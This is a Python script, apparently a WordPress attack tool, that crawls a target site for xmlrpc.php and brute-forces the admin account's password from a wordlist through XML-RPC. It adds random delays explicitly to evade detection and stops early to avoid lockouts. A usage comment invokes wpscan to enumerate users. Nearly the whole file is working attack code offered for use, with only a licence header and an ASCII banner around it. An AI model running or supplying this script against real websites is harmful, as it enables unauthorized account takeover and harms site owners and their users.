######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

#Usage
#python3 -m venv venv
#source venv/bin/activate
#venv\Scripts\activate
#pip install requests beautifulsoup4
#wpscan -u <domain> --enumerate u (for list of users)

def display_splash_screen():
    splash = r"""
               .__                              ___.                 __            _____                                        _____  ____         .__       _____           _______  ____ 
___  ___ _____ |  | _____________    ____       \_ |_________ __ ___/  |_   ____ _/ ____\___________   ____   ____             /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
\  \/  //     \|  | \_  __ \____ \ _/ ___\       | __ \_  __ \  |  \   __\_/ __ \\   __\/  _ \_  __ \_/ ___\_/ __ \   ______  /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
 >    <|  Y Y  \  |__|  | \/  |_> >\  \___       | \_\ \  | \/  |  /|  |  \  ___/ |  | (  <_> )  | \/\  \___\  ___/  /_____/ /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
/__/\_ \__|_|  /____/|__|  |   __/  \___  >______|___  /__|  |____/ |__|   \___  >|__|  \____/|__|    \___  >\___  >         \____   | |___||   __/ |___|  |____   |           \_____  /___|
      \/     \/            |__|         \//_____/    \/                        \/                         \/     \/               |__|      |__|         \/     |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

"""
    print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")

import requests
import xmlrpc.client
import time
import random
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Target Information
BASE_URL = "http://example.com"  # Change this to the target
USERNAME = "admin"
PASSWORD_LIST = "passwords.txt"

# Lockout Prevention
FAILED_ATTEMPTS = 0
LOCKOUT_THRESHOLD = 3  # Stop after 3 failures
SLEEP_MIN, SLEEP_MAX = 5, 10  # Random delay to mimic human behavior

visited_urls = set()
found_xmlrpc = None

def find_xmlrpc(url):
    """Crawl website to find xmlrpc.php within the same domain."""
    global found_xmlrpc

    if url in visited_urls or found_xmlrpc:
        return
    visited_urls.add(url)

    try:
        response = requests.get(url, timeout=5)
        if response.status_code != 200:
            return

        # Check standard XML-RPC location
        xmlrpc_url = urljoin(url, "xmlrpc.php")
        xmlrpc_check = requests.get(xmlrpc_url, timeout=5)
        if xmlrpc_check.status_code == 200:
            print(f"[+] Found XML-RPC: {xmlrpc_url}")
            found_xmlrpc = xmlrpc_url
            return

        # Parse HTML to find more links
        soup = BeautifulSoup(response.text, "html.parser")
        for link in soup.find_all("a", href=True):
            new_url = urljoin(url, link["href"])
            if urlparse(new_url).netloc == urlparse(BASE_URL).netloc:  # Stay in domain
                find_xmlrpc(new_url)

    except requests.RequestException:
        pass

def attempt_login(password):
    """Attempt login while avoiding account lockouts."""
    global FAILED_ATTEMPTS

    if FAILED_ATTEMPTS >= LOCKOUT_THRESHOLD:
        print("[!] Stopping: Possible account lockout detected.")
        return True  # Stop brute-force

    password = password.strip()
    try:
        print(f"[*] Trying: {USERNAME}:{password}")

        # XML-RPC Client
        client = xmlrpc.client.ServerProxy(found_xmlrpc)

        # Attempt authentication
        result = client.wp.getUsersBlogs(USERNAME, password)

        if result:
            print(f"[+] Success! Username: {USERNAME}, Password: {password}")
            return True

    except xmlrpc.client.Fault:
        FAILED_ATTEMPTS += 1  # Increase failed count
        print(f"[-] Failed attempt {FAILED_ATTEMPTS}/{LOCKOUT_THRESHOLD}")

    except Exception as e:
        print(f"[!] Error: {e}")

    # Slow down attempts to avoid detection
    time.sleep(random.uniform(SLEEP_MIN, SLEEP_MAX))
    return False

def brute_force():
    """Brute-force safely, ensuring XML-RPC is found first."""
    if not found_xmlrpc:
        print("[-] XML-RPC not found. Exiting.")
        return

    with open(PASSWORD_LIST, "r", encoding="utf-8") as file:
        for password in file:
            if attempt_login(password):  # Stop if success or lockout threshold reached
                break

if __name__ == "__main__":
    print("[*] Crawling website to find XML-RPC...")
    find_xmlrpc(BASE_URL)

    if found_xmlrpc:
        print("[*] Starting safe brute-force (avoiding account lockouts)...")
        brute_force()
    else:
        print("[-] XML-RPC not found.")



##############################################################
#pip install requests beautifulsoup4
#python xmlrpc_crawler_bruteforce.py
##############################################################
